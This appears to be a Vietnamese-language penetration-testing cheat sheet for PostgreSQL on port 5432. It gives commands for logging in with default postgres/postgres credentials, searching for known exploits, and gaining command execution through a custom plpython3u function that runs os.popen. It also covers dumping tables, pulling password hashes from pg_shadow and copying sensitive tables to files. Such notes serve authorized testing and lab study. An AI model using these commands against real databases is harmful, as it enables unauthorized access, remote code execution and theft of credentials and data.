# PostgreSQL (Port 5432)

## Connect

### psql

Kết nối tới máy chủ PostgreSQL với thông tin đăng nhập và cổng cụ thể:

```
psql -h <ip> -p <port> -U <username> -W
```

***

## Attack Vectors

### Đăng nhập với thông tin mặc định

Thử đăng nhập với thông tin đăng nhập mặc định hoặc yếu như `postgres`/`postgres`:

```
psql -h <ip> -p 5432 -U postgres -W
```

### Khai thác lỗ hổng đã biết

Tìm kiếm lỗ hổng công khai cho phiên bản PostgreSQL cụ thể bằng searchsploit:

```
searchsploit postgresql <version>
```

### Khai thác RCE qua tiện ích mở rộng

Tạo và thực thi tiện ích mở rộng tùy chỉnh để chạy mã hệ thống (yêu cầu quyền quản trị):

```
CREATE EXTENSION IF NOT EXISTS plpython3u;
CREATE OR REPLACE FUNCTION sys_exec(text) RETURNS text AS $$
import os
return os.popen(args[0]).read()
$$ LANGUAGE plpython3u;
SELECT sys_exec('whoami');
```

***

## Post-Exploitation

### Liệt kê cơ sở dữ liệu và bảng

Liệt kê cơ sở dữ liệu, chuyển đổi cơ sở dữ liệu, và liệt kê bảng:

```
\l
\c <db_name>
\dt
```

### Trích xuất dữ liệu từ bảng

Trích xuất dữ liệu từ bảng cụ thể:

```
SELECT * FROM <table_name>;
```

### Trích xuất hash

Lấy tên người dùng và hash mật khẩu từ bảng pg\_shadow:

```
SELECT usename, passwd FROM pg_shadow;
```

### Truy cập hệ thống tệp

Đọc hoặc ghi tệp trên hệ thống nếu có đủ quyền:

```
COPY (SELECT * FROM <sensitive_table>) TO '/tmp/sensitive_data.txt';
```